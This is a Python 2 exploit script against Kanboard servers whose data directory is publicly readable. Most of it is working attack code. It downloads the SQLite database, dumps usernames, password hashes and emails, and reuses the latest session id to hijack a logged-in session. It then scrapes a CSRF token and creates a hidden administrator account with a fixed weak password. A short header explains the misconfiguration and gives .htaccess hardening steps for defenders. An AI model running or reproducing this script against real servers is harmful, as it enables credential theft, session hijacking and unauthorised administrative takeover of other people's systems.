#* This scripts abuses the common configuration mistake for kanboard. By default the data directory is readable and many people forget to reconfigure
# Complaint on Git: https://github.com/kanboard/kanboard/issues/2877, Installation manual: https://docs.kanboard.org/en/latest/admin_guide/installation.html
#* To reconfigure:
#    - enable .htaccess overwrite in /etc/apache2/apache2.conf
#    - Create custom forbiddenpage in /kanboard/forbidden.html (you don't want to leak server version details
#    - Create .htaccess in the data directory containing:
#                Require all denied
#                ErrorDocument 403 http://[URL]/kanboard/forbidden.html
#    - Restart apache: sudo service apache2 restart
#
#* Script is for awareness and educational purposes only
#* Technical debt: implement verbose option, arguments to customize user/passwd to be added and error message's in case db could not be downloaded / internet is not available

import sqlite3
import argparse
import urllib2
import re
import requests
import os
from requests_toolbelt.multipart.encoder import MultipartEncoder

#  Variables
parser = argparse.ArgumentParser()
parser.add_argument("url", help="Kanboard db path usually http://[IP]/kanboard/data/db.sqlite")
parser.add_argument("--showUsers", help="Show the bcrypt hashes and usernames", action="store_true")
parser.add_argument("--stealSession", help="Attempt to use the last valid session id from the db", action="store_true")
parser.add_argument("--addUser",help="When a valid session is available in the db (check with stealSession by grepping result for admin, use this command to add the kanbord/12345678 credential", action="store_true")

args = parser.parse_args()

urlPrefix = args.url.split('kanboard')[0] + 'kanboard'

# Program starts

print "* Start file download"
filedata = urllib2.urlopen(args.url).read()
with open('/tmp/tmpSQLITEDB.sqlite','wb') as f:
    f.write(filedata)

print "* File downloaded sucessfull"
conn = sqlite3.connect('/tmp/tmpSQLITEDB.sqlite')
print "* Database loaded successfully"


# Various options for the attacker
if(args.showUsers):
        cursor = conn.execute("SELECT is_admin, username,password,email FROM users")
        print("- isAdmin username password e-mail")
        for credential in cursor:
            print(str(credential[0]) + " " + str(credential[1]) + " " + str(credential[2]) + " " + str(credential[3]))

if(args.stealSession):
        cursor = conn.execute("select id from sessions where data not like 'redir%' order by expire_at desc limit 1")
        for session in cursor:
                session = str(session[0])
                cookie = "KB_SID=" + session
                print "* Trying with session: " + session

        openPage = urllib2.build_opener()
        openPage.addheaders.append(('Cookie',cookie))
        stealSessionUrl = urlPrefix + '/?controller=UserListController&action=show'
        pageData = openPage.open(stealSessionUrl).read()
        print(pageData)

if(args.addUser):
        cursor = conn.execute("select id from sessions where data not like 'redir%' order by expire_at desc limit 1")
        for session in cursor:
                session = str(session[0])
                cookie="KB_SID=" + session
                print "* Trying with session: " + session

        openPage = urllib2.build_opener()
        openPage.addheaders.append(('Cookie',cookie))
        addUserUrl = urlPrefix + '/?controller=UserCreationController&action=show'
        pageData = openPage.open(addUserUrl).read()
        csrf_regex = '<input type="hidden" name="csrf_token" value="(.*)"/>'
        csrf_array = re.findall(csrf_regex,pageData, re.IGNORECASE)
        postCookie = {cookie}
        for item in csrf_array:
            csrf_token = item
        multipart_data = MultipartEncoder(fields={'csrf_token': csrf_token,'username': 'kanbord_admin','name':'','email':'','password':'12345678','confirmation':'12345678','role':'app-admin','timezone':'','language':'','filter':'','project_id':'0',})

        header={'Content-Type': multipart_data.content_type,'Cookie':cookie}
        addUserUrlTwo = urlPrefix + '/?controller=UserCreationController&action=save'
        response = requests.post(addUserUrlTwo,data=multipart_data,headers=header)
        print"* User kanboard added as admin, try logging in"

conn.close()
os.remove('/tmp/tmpSQLITEDB.sqlite')
